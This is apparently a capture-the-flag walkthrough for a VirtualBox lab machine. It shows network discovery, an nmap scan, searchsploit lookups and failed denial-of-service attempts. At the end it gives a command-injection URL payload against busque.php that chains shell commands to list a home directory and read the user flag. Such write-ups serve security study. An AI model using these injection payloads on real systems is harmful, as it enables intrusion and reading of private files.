 ```
 >> netdiscover -r 10.0.2.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                              
                                                                                                                                                                                            
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 184                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.3        08:00:27:d8:d7:e2      1      60  PCS Systemtechnik GmbH                                                                                                                   
 10.0.2.3        52:55:0a:00:02:03      1      64  Unknown vendor                                                                                                                           
 10.0.2.11       08:00:27:4d:13:cd      1      60  PCS Systemtechnik GmbH                                                                                                                   

                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sS -sV -A 10.0.2.11   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 06:19 EST
Nmap scan report for 10.0.2.11
Host is up (0.00037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:4D:13:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Linux 4.4 (97%), Linux 3.13 (94%), Linux 4.2 (94%), Linux 3.13 - 3.16 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 10.0.2.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.72 seconds
```

Found 2 services running over the VM - ftp and http. So, I searched the Searchsploit for Exploits and found this : 
```
┌──(root㉿kali)-[/home/kali]
└─# searchsploit httpd 2.4.18 
--------------------------------------------------------------------------------------
 Exploit Title                                             |  Path
 --------------------------------------------------------------------------------------
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service  | openbsd/dos/41278.txt
--------------------------------------------------------------------------------------
Shellcodes: No Results

┌──(root㉿kali)-[/home/kali]
└─# searchsploit vsftpd 3.0.3

--------------------------------------------------------------------------------------
 Exploit Title                                             |  Path
--------------------------------------------------------------------------------------
vsftpd 3.0.3 - Remote Denial of Service                    | multiple/remote/49719.py
--------------------------------------------------------------------------------------
Shellcodes: No Results
                            
```


I tried to use the exploit for both for DOS but they both didn't work out well, but then I used basic Web Exploitation and found that Code Execution is available at one of the page i.e. :

"http://10.0.2.11/site/busque.php?buscar=" and then I visited around the whole web server and found that flag by visiting : `http://10.0.2.11/site/busque.php?buscar=pwd;%20cd%20/home/jangow01;%20ls;%20cat%20user.txt` and found that flag as : `d41d8cd98f00b204e9800998ecf8427e`